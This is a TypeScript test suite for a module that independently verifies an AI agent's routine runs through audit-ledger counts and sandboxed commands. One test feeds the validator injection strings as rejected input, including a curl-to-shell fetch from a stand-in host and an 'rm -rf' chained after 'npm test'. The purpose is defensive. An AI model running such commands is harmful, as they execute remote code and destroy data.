import assert from "node:assert/strict";
import { after, before, beforeEach, describe, test } from "node:test";

import { config } from "../../config.js";
import { AppDataSource } from "../db/datasource.js";
import { AIEmployee } from "../db/entities/AIEmployee.js";
import { AuditEvent } from "../db/entities/AuditEvent.js";
import { Routine } from "../db/entities/Routine.js";
import { Run } from "../db/entities/Run.js";
import { RoutineCheck } from "../db/entities/RoutineCheck.js";
import { RunCheckResult } from "../db/entities/RunCheckResult.js";
import {
  closeTestDb,
  initTestDb,
  insert,
  resetTestDb,
  testCompanyId,
  testId,
} from "../test/dbHarness.js";
import type { SandboxCommandResult } from "./agent/sandboxCommandRun.js";
import {
  MAX_CHECKS_PER_ROUTINE,
  RoutineCheckError,
  composeChecksBlock,
  composeRemediationMessage,
  createCheck,
  deleteCheck,
  listChecks,
  parseEffectSpec,
  reorderChecks,
  runChecksForRun,
  serializeCheck,
  serializeCheckResult,
  updateCheck,
} from "./routineChecks.js";

/**
 * What a Check has to guarantee.
 *
 * The load-bearing assertions here are the negative ones. A Check exists so a
 * Run cannot finalize green on the strength of its own account of itself, so
 * every way a check could quietly *not* fail — a spec that no longer parses, a
 * command that never ran, a sandbox that is not there — is tested for the
 * failure it is supposed to produce rather than the silence it used to.
 *
 * The command path is exercised through the `runCommand` seam. Spawning a real
 * bubblewrap child in a unit test would make the suite depend on the developer's
 * kernel; what is being tested here is the decision, not the namespace.
 */

const mutableCodingConfig = config.agent.codingTools as {
  enabled: boolean;
  executionMode: "host" | "bubblewrap" | "disabled";
};
const originalCodingConfig = { ...mutableCodingConfig };

let companyId: string;
let otherCompanyId: string;
let employee: AIEmployee;
let routine: Routine;
let run: Run;

before(initTestDb);
after(async () => {
  Object.assign(mutableCodingConfig, originalCodingConfig);
  await closeTestDb();
});

beforeEach(async () => {
  await resetTestDb();
  Object.assign(mutableCodingConfig, originalCodingConfig);
  // The shipped default. `createCheck` refuses a command check without it, and
  // most of these tests need to be able to create one.
  mutableCodingConfig.enabled = true;
  mutableCodingConfig.executionMode = "bubblewrap";
  companyId = testCompanyId();
  otherCompanyId = testCompanyId();
  employee = await insert(AIEmployee, {
    companyId,
    name: "Ada",
    slug: "ada",
    role: "Analyst",
    soulBody: "",
  });
  routine = await insert(Routine, {
    employeeId: employee.id,
    name: "Daily digest",
    slug: "daily-digest",
    cronExpr: "0 9 * * *",
    body: "Send the digest.",
  });
  run = await insert(Run, {
    routineId: routine.id,
    startedAt: new Date(),
    status: "completed",
  });
});

/** One effect the server recorded during this Run. */
async function ledger(action: string, targetType = "mail_message"): Promise<void> {
  await insert(AuditEvent, {
    companyId,
    actorKind: "ai",
    actorEmployeeId: employee.id,
    runId: run.id,
    action,
    targetType,
    targetLabel: action,
  });
}

async function effectCheck(
  spec: Record<string, unknown>,
  over: { name?: string; required?: boolean; enabled?: boolean } = {},
): Promise<RoutineCheck> {
  return createCheck({
    companyId,
    routineId: routine.id,
    name: over.name ?? "The digest went out",
    kind: "effect",
    spec: JSON.stringify(spec),
    required: over.required,
    enabled: over.enabled,
    createdById: testId("user"),
  });
}

function runChecks(over: Partial<Parameters<typeof runChecksForRun>[0]> = {}) {
  return runChecksForRun({
    run,
    routine,
    employee,
    companyId,
    cwd: "/tmp",
    attempt: 0,
    deadlineAtMs: Date.now() + 60_000,
    ...over,
  });
}

/** A stand-in for the sandbox: whatever exit code the test wants. */
function fakeCommand(
  result: Partial<SandboxCommandResult>,
  onCall?: (options: { timeoutMs: number; args: string[] }) => void,
): NonNullable<Parameters<typeof runChecksForRun>[0]["runCommand"]> {
  return async (options) => {
    onCall?.({ timeoutMs: options.timeoutMs, args: options.args });
    return {
      output: "",
      exitCode: 0,
      timedOut: false,
      aborted: false,
      truncated: false,
      ...result,
    };
  };
}

describe("parseEffectSpec", () => {
  test("fills in the default minimum and keeps the rest", () => {
    const spec = parseEffectSpec(JSON.stringify({ action: "mail.send" }));
    assert.equal(spec.action, "mail.send");
    assert.equal(spec.min, 1);
    assert.equal(spec.max, undefined);
  });

  test("refuses garbage, unknown keys, and a window nothing could satisfy", () => {
    assert.throws(() => parseEffectSpec("{not json"), RoutineCheckError);
    assert.throws(() => parseEffectSpec(JSON.stringify({})), RoutineCheckError);
    assert.throws(
      () => parseEffectSpec(JSON.stringify({ action: "a", surprise: 1 })),
      RoutineCheckError,
    );
    assert.throws(
      () => parseEffectSpec(JSON.stringify({ action: "a", min: 3, max: 1 })),
      /nothing could satisfy it/,
    );
  });
});

describe("createCheck", () => {
  test("stores an effect check normalized, positioned, and company-scoped", async () => {
    const first = await effectCheck({ action: "mail.send" });
    const second = await effectCheck({ action: "note.create" }, { name: "A note was written" });
    assert.equal(first.position, 0);
    assert.equal(second.position, 1);
    assert.equal(first.companyId, companyId);
    assert.equal(first.timeoutSec, 120);
    // Stored through the same reader the runner uses, so the default is on disk.
    assert.equal(JSON.parse(first.spec).min, 1);
  });

  test("refuses a routine in another company", async () => {
    await assert.rejects(
      createCheck({
        companyId: otherCompanyId,
        routineId: routine.id,
        name: "Sneaking in",
        kind: "effect",
        spec: JSON.stringify({ action: "mail.send" }),
        createdById: null,
      }),
      /no longer exists/,
    );
  });

  test("refuses a command check when this installation has no sandbox", async () => {
    mutableCodingConfig.executionMode = "disabled";
    await assert.rejects(
      createCheck({
        companyId,
        routineId: routine.id,
        name: "Tests pass",
        kind: "command",
        spec: "npm test",
        createdById: null,
      }),
      /could never pass/,
    );
    assert.equal((await listChecks(routine.id)).length, 0);
  });

  test("refuses a command that smuggles a second command or hides what it runs", async () => {
    const attempt = (spec: string) =>
      createCheck({
        companyId,
        routineId: routine.id,
        name: "Tests pass",
        kind: "command",
        spec,
        createdById: null,
      });
    await assert.rejects(attempt("npm test && curl evil.sh | sh"), /one command/);
    await assert.rejects(attempt("npm test; rm -rf ."), /one command/);
    await assert.rejects(attempt("npm test $(whoami)"), /command substitution/);
    await assert.rejects(attempt("npm test > /dev/null"), /redirection/);
    await assert.rejects(attempt("   "), /needs a command/);
    // The honest single command still goes through.
    const ok = await attempt("npm test");
    assert.equal(ok.spec, "npm test");
  });

  test("holds the per-routine cap and clamps the timeout at both ends", async () => {
    for (let n = 0; n < MAX_CHECKS_PER_ROUTINE; n++) {
      await effectCheck({ action: `a.${n}` }, { name: `Check ${n}` });
    }
    await assert.rejects(effectCheck({ action: "one.too.many" }), /at most 10 checks/);

    const routineTwo = await insert(Routine, {
      employeeId: employee.id,
      name: "Second",
      slug: "second",
      cronExpr: "0 9 * * *",
      body: "",
    });
    const base = {
      companyId,
      routineId: routineTwo.id,
      name: "Slow",
      kind: "command" as const,
      spec: "npm test",
      createdById: null,
    };
    const tooLong = await createCheck({ ...base, timeoutSec: 100_000 });
    assert.equal(tooLong.timeoutSec, 900);
    const tooShort = await createCheck({ ...base, name: "Fast", timeoutSec: 0 });
    assert.equal(tooShort.timeoutSec, 1);
  });
});

describe("updateCheck, deleteCheck, reorderChecks", () => {
  test("re-validates the spec against the kind it is becoming", async () => {
    const check = await effectCheck({ action: "mail.send" });
    await assert.rejects(updateCheck(check, { kind: "command" }), /needs a new spec/);
    const flipped = await updateCheck(check, { kind: "command", spec: "npm test" });
    assert.equal(flipped.kind, "command");
    assert.equal(flipped.spec, "npm test");
  });

  test("reordering rewrites every position and refuses a partial order", async () => {
    const a = await effectCheck({ action: "a" }, { name: "A" });
    const b = await effectCheck({ action: "b" }, { name: "B" });
    const c = await effectCheck({ action: "c" }, { name: "C" });
    await assert.rejects(reorderChecks(routine.id, [c.id, a.id]), /every check/);
    await assert.rejects(reorderChecks(routine.id, [c.id, c.id, a.id]), /listed twice/);
    await reorderChecks(routine.id, [c.id, b.id, a.id]);
    assert.deepEqual(
      (await listChecks(routine.id)).map((check) => check.name),
      ["C", "B", "A"],
    );
  });

  test("a deleted check leaves its results behind, still readable", async () => {
    const check = await effectCheck({ action: "mail.send" });
    const before = await runChecks();
    assert.equal(before.results.length, 1);

    await deleteCheck(check);

    const results = await AppDataSource.getRepository(RunCheckResult).findBy({ runId: run.id });
    assert.equal(results.length, 1);
    assert.equal(results[0].checkId, null, "the link goes, the evidence stays");
    assert.equal(results[0].name, "The digest went out");
    assert.equal(results[0].kind, "effect");
    assert.equal(results[0].required, true);
  });
});

describe("runChecksForRun — the effect kind", () => {
  test("passes at the minimum and fails below it, with the arithmetic in words", async () => {
    await effectCheck({ action: "mail.send", min: 1 });

    const missing = await runChecks();
    assert.equal(missing.verdict, "failed");
    assert.equal(missing.results[0].passed, false);
    assert.match(missing.results[0].detail, /expected at least 1 `mail\.send`, the ledger has 0/);

    await ledger("mail.send");
    const met = await runChecks({ attempt: 1 });
    assert.equal(met.verdict, "passed");
    assert.equal(met.results[0].passed, true);
    assert.match(met.results[0].detail, /the ledger has 1/);
    assert.equal(met.results[0].attempt, 1);
  });

  test("fails above the maximum", async () => {
    await effectCheck({ action: "mail.send", min: 0, max: 2 });
    await ledger("mail.send");
    await ledger("mail.send");
    assert.equal((await runChecks()).verdict, "passed");
    await ledger("mail.send");
    const over = await runChecks({ attempt: 1 });
    assert.equal(over.verdict, "failed");
    assert.match(over.results[0].detail, /expected between 0 and 2 .*the ledger has 3/);
  });

  test("targetType narrows what counts", async () => {
    await effectCheck({ action: "note.create", targetType: "note" });
    await ledger("note.create", "deal");
    const wrongTarget = await runChecks();
    assert.equal(wrongTarget.verdict, "failed");
    assert.match(wrongTarget.results[0].detail, /`note\.create` on note, the ledger has 0/);

    await ledger("note.create", "note");
    assert.equal((await runChecks({ attempt: 1 })).verdict, "passed");
  });

  test("counts only this Run's effects", async () => {
    await effectCheck({ action: "mail.send" });
    const otherRun = await insert(Run, {
      routineId: routine.id,
      startedAt: new Date(),
      status: "completed",
    });
    await insert(AuditEvent, {
      companyId,
      actorKind: "ai",
      runId: otherRun.id,
      action: "mail.send",
      targetType: "mail_message",
    });
    assert.equal((await runChecks()).verdict, "failed");
  });

  test("a spec that no longer parses fails loudly rather than passing", async () => {
    const check = await effectCheck({ action: "mail.send" });
    // Straight to the column, the way a bad migration or a hand-edit would.
    await AppDataSource.getRepository(RoutineCheck).update({ id: check.id }, { spec: "{oops" });

    const outcome = await runChecks();
    assert.equal(outcome.verdict, "failed");
    assert.equal(outcome.results[0].passed, false);
    assert.match(outcome.results[0].detail, /could not be read/);
  });
});

describe("runChecksForRun — verdicts", () => {
  test("a routine with no enabled checks records not_run and writes nothing", async () => {
    await effectCheck({ action: "mail.send" }, { enabled: false });
    const outcome = await runChecks();
    assert.equal(outcome.verdict, "not_run");
    assert.equal(outcome.results.length, 0);
    assert.equal(await AppDataSource.getRepository(RunCheckResult).countBy({ runId: run.id }), 0);
  });

  test("a non-required failure is recorded but leaves the verdict passed", async () => {
    await effectCheck({ action: "mail.send" }, { name: "Mail went out" });
    await effectCheck({ action: "chart.render" }, { name: "Chart refreshed", required: false });
    await ledger("mail.send");

    const outcome = await runChecks();
    assert.equal(outcome.verdict, "passed");
    assert.equal(outcome.results.length, 2);
    const advisory = outcome.results.find((r) => r.name === "Chart refreshed");
    assert.equal(advisory?.passed, false, "it still failed, and the row says so");
    assert.equal(advisory?.required, false);
  });

  test("checks run in position order", async () => {
    const a = await effectCheck({ action: "a" }, { name: "A" });
    const b = await effectCheck({ action: "b" }, { name: "B" });
    await reorderChecks(routine.id, [b.id, a.id]);
    const outcome = await runChecks();
    assert.deepEqual(
      outcome.results.map((r) => r.name),
      ["B", "A"],
    );
  });

  test("refuses to read another company's checks", async () => {
    await effectCheck({ action: "mail.send" });
    const outcome = await runChecks({ companyId: otherCompanyId });
    assert.equal(outcome.verdict, "not_run");
    assert.equal((await listChecks(routine.id, otherCompanyId)).length, 0);
    assert.equal((await listChecks(routine.id, companyId)).length, 1);
  });
});

describe("runChecksForRun — the command kind", () => {
  async function commandCheck(spec = "npm test", timeoutSec = 30): Promise<RoutineCheck> {
    return createCheck({
      companyId,
      routineId: routine.id,
      name: "Tests pass",
      kind: "command",
      spec,
      timeoutSec,
      createdById: null,
    });
  }

  test("exit 0 passes and keeps the output as the detail", async () => {
    await commandCheck();
    const outcome = await runChecks({
      runCommand: fakeCommand({ exitCode: 0, output: "12 passing" }),
    });
    assert.equal(outcome.verdict, "passed");
    assert.equal(outcome.results[0].passed, true);
    assert.equal(outcome.results[0].exitCode, 0);
    assert.equal(outcome.results[0].detail, "12 passing");
  });

  test("any other exit code fails, and the command itself reaches the shell", async () => {
    await commandCheck("npm test");
    const seen: string[][] = [];
    const outcome = await runChecks({
      runCommand: fakeCommand({ exitCode: 1, output: "1 failing" }, (o) => seen.push(o.args)),
    });
    assert.equal(outcome.verdict, "failed");
    assert.equal(outcome.results[0].exitCode, 1);
    assert.equal(outcome.results[0].detail, "1 failing");
    assert.ok(seen[0].includes("npm test"), "the command is what runs");
    assert.ok(!seen[0].includes("-lc"), "never a login shell — the employee writes $HOME");
  });

  test("the timeout is the smaller of the check's ceiling and the Run's remaining budget", async () => {
    await commandCheck("npm test", 300);
    const timeouts: number[] = [];
    await runChecks({
      deadlineAtMs: Date.now() + 5_000,
      runCommand: fakeCommand({ exitCode: 0 }, (o) => timeouts.push(o.timeoutMs)),
    });
    assert.ok(timeouts[0] <= 5_000, `checks never extend the Run's deadline (${timeouts[0]}ms)`);

    const generous: number[] = [];
    await runChecks({
      attempt: 1,
      deadlineAtMs: Date.now() + 10 * 60_000,
      runCommand: fakeCommand({ exitCode: 0 }, (o) => generous.push(o.timeoutMs)),
    });
    assert.equal(generous[0], 300_000);
  });

  test("a check that could not be run is a failed check, not a skipped one", async () => {
    await commandCheck();
    // The Run's whole budget is already spent, so the check is unrunnable.
    const outcome = await runChecks({ deadlineAtMs: Date.now() - 1 });
    assert.equal(outcome.verdict, "failed");
    assert.equal(outcome.results.length, 1, "the row exists — silence is the bug being fixed");
    assert.equal(outcome.results[0].passed, false);
    assert.equal(outcome.results[0].exitCode, null);
    assert.match(outcome.results[0].detail, /could not be run: the Run had already used/);
  });

  test("a sandbox that went away after the check was written fails the check", async () => {
    await commandCheck();
    mutableCodingConfig.executionMode = "disabled";
    // No seam here: this is the production path deciding it cannot run.
    const outcome = await runChecks();
    assert.equal(outcome.verdict, "failed");
    assert.equal(outcome.results[0].passed, false);
    assert.match(outcome.results[0].detail, /could not be run/);
  });

  test("a stopped Run fails its remaining checks rather than skipping them", async () => {
    await commandCheck();
    const controller = new AbortController();
    controller.abort();
    const outcome = await runChecks({ signal: controller.signal });
    assert.equal(outcome.verdict, "failed");
    assert.match(outcome.results[0].detail, /the Run was stopped/);
  });
});

describe("composeChecksBlock", () => {
  test("names every enabled check and says what it asserts", async () => {
    await effectCheck({ action: "mail.send", min: 2 }, { name: "Two digests went out" });
    await effectCheck(
      { action: "note.create", targetType: "note", min: 0, max: 3 },
      { name: "Not too many notes", required: false },
    );
    await createCheck({
      companyId,
      routineId: routine.id,
      name: "Tests pass",
      kind: "command",
      spec: "npm test",
      createdById: null,
    });
    await effectCheck({ action: "hidden" }, { name: "Disabled one", enabled: false });

    const block = composeChecksBlock(await listChecks(routine.id));
    assert.ok(block);
    assert.match(block, /Two digests went out\*\* \(required\) — .*at least 2 `mail\.send`/);
    assert.match(
      block,
      /Not too many notes\*\* \(advisory\) — .*between 0 and 3 `note\.create` on note/,
    );
    assert.match(block, /Tests pass\*\* \(required\) — the command `npm test` must exit 0/);
    assert.doesNotMatch(block, /Disabled one/);
    assert.match(block, /cannot see, change, or run them/);
  });

  test("returns null when there is nothing to aim at", async () => {
    assert.equal(composeChecksBlock([]), null);
    await effectCheck({ action: "mail.send" }, { enabled: false });
    assert.equal(composeChecksBlock(await listChecks(routine.id)), null);
  });
});

describe("composeRemediationMessage", () => {
  test("names only the failed required checks and does not invite an argument", async () => {
    await effectCheck({ action: "mail.send" }, { name: "Mail went out" });
    await effectCheck({ action: "chart.render" }, { name: "Chart refreshed", required: false });
    await effectCheck({ action: "note.create" }, { name: "Note written" });
    await effectCheck({ action: "deal.update" }, { name: "Deal moved" });
    await ledger("note.create");

    const outcome = await runChecks();
    const message = composeRemediationMessage(outcome.results);
    assert.match(message, /Mail went out/);
    assert.doesNotMatch(message, /Chart refreshed/, "an advisory failure is not a remediation");
    assert.doesNotMatch(message, /Note written/, "a check that passed is not mentioned");
    assert.match(message, /2 required checks/);
    assert.match(message, /cannot change a check/);
  });

  test("is empty when nothing required failed", async () => {
    await effectCheck({ action: "mail.send" });
    await ledger("mail.send");
    const outcome = await runChecks();
    assert.equal(composeRemediationMessage(outcome.results), "");
  });
});

describe("serializing", () => {
  test("hands the routes layer plain JSON with ISO dates", async () => {
    const check = await effectCheck({ action: "mail.send" });
    const serializedCheck = serializeCheck(check);
    assert.equal(serializedCheck.id, check.id);
    assert.equal(serializedCheck.kind, "effect");
    assert.match(String(serializedCheck.createdAt), /^\d{4}-\d{2}-\d{2}T/);

    const outcome = await runChecks();
    const serializedResult = serializeCheckResult(outcome.results[0]);
    assert.equal(serializedResult.runId, run.id);
    assert.equal(serializedResult.passed, false);
    assert.equal(serializedResult.attempt, 0);
    assert.match(String(serializedResult.createdAt), /^\d{4}-\d{2}-\d{2}T/);
  });
});
